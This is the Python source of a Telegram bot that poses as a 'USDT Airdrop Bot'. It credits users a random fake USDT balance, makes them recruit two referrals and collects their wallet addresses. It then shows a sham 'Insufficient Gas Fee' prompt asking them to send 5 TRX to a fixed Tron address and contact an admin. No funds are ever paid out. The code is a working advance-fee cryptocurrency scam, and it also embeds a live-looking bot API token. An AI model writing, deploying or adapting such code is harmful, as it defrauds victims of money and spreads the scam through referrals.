import telebot
import random
from telebot import types

bot = telebot.TeleBot("7927183325:AAFWcS1ECBQU5CHkr2riVF4Y0e8SjY03_7M")

user_data = {}
referrals = {}
rewarded = {}

MIN_REFS = 2

def get_ref_link(user_id):
    return f"https://t.me/USDT_airdrop_bot?start={user_id}"

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    args = message.text.split()
    
    if user_id not in referrals:
        referrals[user_id] = []
    
    if len(args) > 1:
        referrer = int(args[1])
        if referrer != user_id and user_id not in referrals.get(referrer, []):
            referrals.setdefault(referrer, []).append(user_id)
    
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("✅ Join Group", url="https://t.me/Verifiedupiloot")
    verify_btn = types.InlineKeyboardButton("👉 Verify", callback_data="verify")
    markup.add(btn)
    markup.add(verify_btn)
    
    bot.send_message(user_id, "👋 Welcome to USDT Airdrop Bot!\n\n🎁 Join the group to claim free USDT.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    user_id = call.from_user.id
    if user_id not in rewarded:
        usdt = random.randint(199, 233)
        user_data[user_id] = {'usdt': usdt, 'wallet': '', 'refs': 0}
        rewarded[user_id] = True

        markup = types.InlineKeyboardMarkup()
        withdraw = types.InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")
        markup.add(withdraw)

        bot.send_message(user_id, f"🎉 You received **{usdt} USDT**!\n\nInvite 2 friends to withdraw.", parse_mode='Markdown', reply_markup=markup)
    else:
        bot.answer_callback_query(call.id, "✅ Already verified!")

@bot.callback_query_handler(func=lambda call: call.data == "withdraw")
def withdraw(call):
    user_id = call.from_user.id
    refs = len(referrals.get(user_id, []))
    if refs < MIN_REFS:
        bot.send_message(user_id, f"❌ You need at least {MIN_REFS} referrals.\n\nYour referral link:\n{get_ref_link(user_id)}")
    else:
        msg = bot.send_message(user_id, "🔐 Send your *USDT TRC20 wallet address*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, get_wallet)

def get_wallet(message):
    user_id = message.from_user.id
    user_data[user_id]['wallet'] = message.text
    msg = bot.send_message(user_id, "💰 Enter amount to withdraw:")
    bot.register_next_step_handler(msg, confirm_withdraw)

def confirm_withdraw(message):
    user_id = message.from_user.id
    try:
        amount = float(message.text)
        balance = user_data[user_id]['usdt']
        if amount > balance:
            bot.send_message(user_id, f"❌ You only have {balance} USDT.")
        else:
            user_data[user_id]['usdt'] -= amount
            markup = types.InlineKeyboardMarkup()
            btn = types.InlineKeyboardButton("🔄 Transfer", callback_data="transfer_now")
            markup.add(btn)
            bot.send_message(user_id, f"✅ {amount} USDT added to your wallet!\n\nBalance: {user_data[user_id]['usdt']} USDT", reply_markup=markup)
    except:
        bot.send_message(user_id, "❌ Invalid amount.")

@bot.callback_query_handler(func=lambda call: call.data == "transfer_now")
def gas_fee_popup(call):
    markup = types.InlineKeyboardMarkup()
    pay_btn = types.InlineKeyboardButton("🚀 Pay 5 TRX Gas Fee", url="https://tronscan.org/#/address/TAiQJFMpuHcXzek9TBE4ciLevgpe31TPgN")
    markup.add(pay_btn)
    bot.send_message(call.from_user.id, "⚠️ *Insufficient Gas Fee!*\n\nTo complete this transfer, deposit *5 TRX* to cover network fees.", parse_mode='Markdown', reply_markup=markup)
    bot.send_message(call.from_user.id, f"📩 After payment, contact admin: @Julu789")

bot.polling()
